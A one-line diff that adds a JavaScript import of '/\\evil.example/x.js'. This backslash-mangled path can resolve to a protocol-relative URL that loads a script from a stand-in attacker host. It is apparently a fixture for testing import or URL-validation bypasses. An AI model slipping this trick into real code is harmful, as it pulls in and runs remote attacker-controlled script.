@@ -1,0 +1,1 @@
+import '/\\evil.example/x.js';
